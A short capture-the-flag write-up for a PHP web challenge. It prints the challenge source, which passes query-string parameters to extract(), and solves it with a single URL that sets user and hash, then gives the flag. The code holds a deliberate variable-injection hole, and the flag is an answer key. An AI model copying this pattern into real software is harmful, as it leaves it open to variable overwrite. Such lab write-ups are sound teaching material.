# GLOBALization
Web

## Challenge 

We all know that GLOBALization is good. But is it....?

http://challs.hats.sg:1345/?SRC

http://challs.hats.sg:1345/

Flag format: flag{.+}

Challenge by: Gladiator

## Solution


	<?php 
	    if(isset($_GET['SRC'])){
	        show_source("index.php");
	        die();
	    }
	    require_once 'flag.php';
	    $dumpdump = [];
	    $heyhey = explode('?',$_SERVER["REQUEST_URI"]);
	    $dumpdumpdumpdeedumpdump = explode("&", $heyhey[1]);
	    foreach($dumpdumpdumpdeedumpdump as $zuluonetwothreefour){
	        $karaokeeee = explode("=",$zuluonetwothreefour);
	        $dumpdump[$karaokeeee[0]] = $karaokeeee[1];
	    }
	    @extract($dumpdump);
	    if($user==="admin"&&$hash==="FB9084AAF8C821B98DCA47323FD3975CF5F41B26B9D9EB9A37B235A236027459"){
	        echo $flag . "<br>";
	    }

	?>

	<!DOCTYPE html>
	<html>
	<head>
	    <title></title>
	</head>
	<body>
	    I HAVE A REQUEST!!!!!<br>
	    Please give me<br>
	    Give me SRC, I will GET you smth?<br>
	</body>
	</html>

Go to the page

http://challs.hats.sg:1345/?user=admin&hash=FB9084AAF8C821B98DCA47323FD3975CF5F41B26B9D9EB9A37B235A236027459

## Flag

	flag{blobal_global_flobal}
